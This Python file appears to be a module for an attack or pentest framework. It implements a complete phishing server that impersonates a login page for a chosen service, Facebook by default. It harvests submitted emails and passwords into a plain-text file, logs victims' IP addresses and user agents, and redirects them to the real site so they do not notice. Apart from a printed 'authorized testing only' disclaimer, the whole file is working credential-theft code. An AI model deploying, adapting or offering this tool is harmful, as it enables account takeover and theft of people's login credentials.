"""
Simple phishing server - all in one, no folder setup needed
"""

MODULE_INFO = {
    "description": "Simple phishing server with built-in login page"
}

OPTIONS = {
    "target_service": {
        "type": "str",
        "description": "Service name for the fake page (e.g., Facebook, Google)",
        "required": True,
        "default": "Facebook"
    },
    "host": {
        "type": "str", 
        "description": "Host to listen on",
        "required": False,
        "default": "127.0.0.1"
    },
    "port": {
        "type": "int",
        "description": "Port to listen on",
        "required": False,
        "default": 8080
    }
}

from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import datetime
import json
from urllib.parse import parse_qs

class SimplePhishingHandler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        """Serve the phishing page"""
        if self.path == '/':
            self.serve_phishing_page()
        else:
            self.send_error(404, "Page not found")
    
    def do_POST(self):
        """Capture login credentials"""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # Parse the form data
        form_data = parse_qs(post_data)
        credentials = {k: v[0] for k, v in form_data.items() if v}
        
        # Capture credentials
        self.capture_credentials(credentials)
        
        # Redirect to real service (looks more believable)
        self.send_response(302)
        self.send_header('Location', 'https://www.facebook.com')
        self.end_headers()
    
    def serve_phishing_page(self):
        """Serve a simple phishing page"""
        service_name = self.server.service_name
        
        html = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{service_name} - Login</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            background: linear-gradient(120deg, #1877f2, #42b72a);
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }}
        .login-container {{
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.2);
            width: 400px;
        }}
        .logo {{
            text-align: center;
            font-size: 32px;
            font-weight: bold;
            color: #1877f2;
            margin-bottom: 20px;
        }}
        input[type="text"], input[type="password"] {{
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            box-sizing: border-box;
        }}
        input[type="submit"] {{
            width: 100%;
            background: #1877f2;
            color: white;
            padding: 15px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }}
        input[type="submit"]:hover {{
            background: #166fe5;
        }}
        .footer {{
            text-align: center;
            margin-top: 20px;
            color: #666;
            font-size: 12px;
        }}
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">{service_name}</div>
        <form method="POST">
            <input type="text" name="email" placeholder="Email or phone number" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Log In">
        </form>
        <div class="footer">
            <p>By continuing, you agree to our Terms & Privacy Policy</p>
        </div>
    </div>
</body>
</html>
"""
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))
        
        print(f"[+] Served phishing page for {service_name}")
    
    def capture_credentials(self, credentials):
        """Capture and display credentials"""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client_ip = self.client_address[0]
        
        print(f"\n" + "="*60)
        print(f"🔥 CREDENTIALS CAPTURED - {timestamp} 🔥")
        print(f"IP Address: {client_ip}")
        print(f"User-Agent: {self.headers.get('User-Agent', 'Unknown')}")
        print("-"*60)
        
        for field, value in credentials.items():
            if 'password' in field.lower():
                print(f"{field}: {'*' * len(value)}")
            else:
                print(f"{field}: {value}")
        
        print("="*60)
        
        # Save to file
        with open('captured_credentials.txt', 'a') as f:
            f.write(f"\n[{timestamp}] From {client_ip}\n")
            for field, value in credentials.items():
                f.write(f"{field}: {value}\n")
            f.write("-"*40 + "\n")
    
    def log_message(self, format, *args):
        """Suppress normal logs"""
        pass

def run(session, options):
    service_name = options.get("target_service", "Facebook")
    host = options.get("host", "127.0.0.1")
    port = int(options.get("port", 8080))
    
    print(f"[*] Starting SIMPLE phishing server...")
    print(f"[*] Service: {service_name}")
    print(f"[*] URL: http://{host}:{port}")
    print(f"[*] Credentials will be saved to: captured_credentials.txt")
    print("-"*50)
    print("[!] LEGAL DISCLAIMER: For authorized testing only!")
    print("-"*50)
    
    class CustomServer(HTTPServer):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, **kwargs)
            self.service_name = service_name
    
    try:
        server = CustomServer((host, port), SimplePhishingHandler)
        
        print(f"[+] Phishing server running!")
        print(f"[+] Open this URL in browser: http://{host}:{port}")
        print(f"[+] Waiting for credentials...")
        print(f"[+] Press Ctrl+C to stop\n")
        
        # Run server in thread
        def run_server():
            try:
                server.serve_forever()
            except KeyboardInterrupt:
                print("\n[*] Stopping server...")
        
        server_thread = threading.Thread(target=run_server)
        server_thread.daemon = True
        server_thread.start()
        
        # Keep running
        try:
            while True:
                server_thread.join(1)
        except KeyboardInterrupt:
            print("\n[*] Shutting down...")
            server.shutdown()
        
        return True
        
    except Exception as e:
        print(f"[!] Error: {e}")
        return False
